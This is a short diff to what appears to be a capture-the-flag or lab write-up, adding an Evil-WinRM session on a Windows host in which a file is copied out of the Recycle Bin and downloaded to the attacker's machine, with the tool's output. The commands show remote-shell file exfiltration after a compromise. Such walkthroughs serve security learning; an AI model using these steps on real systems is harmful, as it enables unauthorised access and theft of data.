@@ -852,5 +852,15 @@ Mode                LastWriteTime         Length Name
 ```
 Here are all the files mentioned
 
+```python
+*Evil-WinRM* PS C:\Users\l.thompson\Desktop> Copy-Item 'C:\$Recycle.Bin\S-1-5-21-3314170591-2632404997-3798122088-1129\$RY0735O.xml' RY0735O.xml
+*Evil-WinRM* PS C:\Users\l.thompson\Desktop> download RY0735O.xml
+                                        
+Info: Downloading C:\Users\l.thompson\Desktop\RY0735O.xml to RY0735O.xml
+                                        
+Info: Download successful!
+```
+Ill download all the files using the same method as i did above
+
 
 
